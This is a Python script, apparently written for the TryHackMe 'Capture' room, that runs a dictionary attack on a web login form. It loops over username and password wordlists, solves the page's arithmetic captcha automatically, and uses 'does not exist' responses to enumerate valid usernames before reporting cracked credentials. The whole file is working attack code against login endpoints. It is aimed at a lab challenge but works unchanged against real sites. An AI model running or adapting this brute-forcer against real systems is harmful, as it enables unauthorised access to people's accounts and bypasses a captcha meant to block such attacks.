#!./room/bin/python3
# Change shebang to use your python source or venv. 

import requests
from bs4 import BeautifulSoup
import argparse
from termcolor import colored, cprint


parser = argparse.ArgumentParser(prog='Gambeta Rojões',
                                 description='''http post method dictionary attack utilitary built to solve "Capture" TryHackMe challenge.
                                 ''',
                                 epilog='author: github.com/carlossb1 - script built for fun, will not (and is not expected to) outperform other stabilished solutions. ')


parser.add_argument('-u','--url', type=str, required = True,help = 'target endpoint url for post request i.e http://example.com/login')
parser.add_argument('-p','--port', type=int, default=80, help = 'server port - (default: 80)')
parser.add_argument('-l','--login', type=str, required = True, help = 'path to logins wordlist i.e /usr/share/wordlists/example.txt')
parser.add_argument('-P','--passwd', type=str,required = True, help = 'path to password list')

args = parser.parse_args()

# some headers copied from a cURL request to the login endpoint

headers = {                                                                                                                                                                                                                               
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',                                                                                                                                               
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',                                                                                                                                                          
    'Accept-Language': 'en-US,en;q=0.5',                                                                                                                                                                                                  
    'Accept-Encoding': 'gzip,deflate,br',                                                                                                                                                                                                 
    'Content-Type': 'application/x-www-form-urlencoded',                                                                                                                                                                                  
    'Connection': 'keep-alive',                                                                                                                                                                                                           
    'Upgrade-Insecure-Requests': '1',                                                                                                                                                                                                     
}  

# parses the response html, extract the captcha values as a list and send them to operation() to be solved.
# the "operation" function is actually pretty silly lol - i would not be surprised if it ends up appearing in  /r/programminghorror

def solve_captcha(response:str) -> int:
    soup = BeautifulSoup(response, 'html.parser')
    captcha_question = soup.find('label', {'for': 'usr'}).find_next('br').next_sibling.strip()
    captcha_questions = captcha_question.split(' ')
    result = operation(captcha_questions)

    return result


# open files specified at the command line an returns the corresponding  wordlists 
def read_payload(login_list: str, password_list: str) -> tuple[list,list]:
    
    try:
        with open(login_list,'r') as lf:
            login_payload = [line.strip() for line in lf.readlines()]
    except Exception as e:
        print(f"Error loading login wordlist: {e}")
   
    try:
       with open(password_list,'r') as pf:
           password_payload = [line.strip() for line in pf.readlines()]
    except Exception as e:
        print(f"Error loading password list : {e}")

    return login_payload, password_payload


# it's not much, but it's honest work lmao

def operation(operation:list) -> int:
    num1 = int(operation[0])
    num2 = int(operation[2])
    operator = operation[1]

    if operator == '+':
        return num1+num2
    elif operator == '-':
        return num1-num2
    elif operator == '/':
        return num1/num2
    elif operator == '*':
        return num1*num2
    

def crack_login(logins:list,passwords:list) -> bool:
    data = {'username': 'random',
             'password': 'passwd'}
    for login in logins:
        
        for password in passwords:
            data['username'] = login
            data['password'] = password
            
            cprint(f'[ * ] Trying to authenticate as : {login}','light_blue')

            r = requests.post(args.url, headers = headers , data = data)
            if 'captcha' in r.text.lower():
                data['captcha'] = solve_captcha(r.text)
                r = requests.post(args.url, headers = headers, data = data)
            if 'not exist' in r.text.lower():
                cprint(f"[ * ] User {login} does not exist - skipping password attack",'light_red')
                break
            if not 'invalid password' in r.text.lower():
                cprint(f"[ * ] Successfully authenticated as login: {login} password: {password}",'light_green')
                exit()


def main ():

    logins,passwords = read_payload(args.login,args.passwd)
    crack_login(logins,passwords)



if __name__ == '__main__':
    main()
